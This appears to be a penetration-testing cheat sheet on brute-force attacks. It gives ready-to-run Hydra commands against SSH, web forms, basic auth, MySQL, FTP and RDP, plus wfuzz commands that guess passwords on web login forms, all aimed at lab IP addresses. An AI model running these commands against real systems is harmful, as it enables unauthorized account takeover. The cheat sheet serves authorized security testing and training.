# Bruteforce Attacks

## Hydra

{% tabs %}
{% tab title="SSH" %}
```bash
hydra -l george -s 2222 -P /usr/share/wordlists/rockyou.txt 192.168.109.201 ssh
```
{% endtab %}

{% tab title="Web From" %}
```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.109.201 \
  http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```
{% endtab %}

{% tab title="Basic Auth" %}
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.109.201 http-get
```
{% endtab %}

{% tab title="MySQL" %}
```bash
hydra -l michael -P /usr/share/wordlists/rockyou.txt 192.168.201.96 mysql
```
{% endtab %}

{% tab title="FTP" %}
```bash
hydra -l michael -P /usr/share/wordlists/rockyou.txt 192.168.201.96 ftp
```
{% endtab %}

{% tab title="RDP" %}
```bash
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
```
{% endtab %}
{% endtabs %}

### WFUZZ

{% tabs %}
{% tab title="Web Form (url-encoded)" %}
```bash
wfuzz -u http://192.168.109.201:80/index.php -w /usr/share/wordlists/rockyou.txt -X POST \
  -d "fm_user=user&fm_pwd=FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Cookie: filemanager=ic30bqm5vou55gfu3pavt8n2bi" \
  --hw 1750
```
{% endtab %}

{% tab title="Web Form (JSON)" %}
```bash
wfuzz -u http://192.22.174.3:8000/login -w testwordlist.txt -X POST \
  -d '{"email":"admin@secbank.com","password":"FUZZ"}' \
  -H "Content-Type: application/json"
```
{% endtab %}
{% endtabs %}

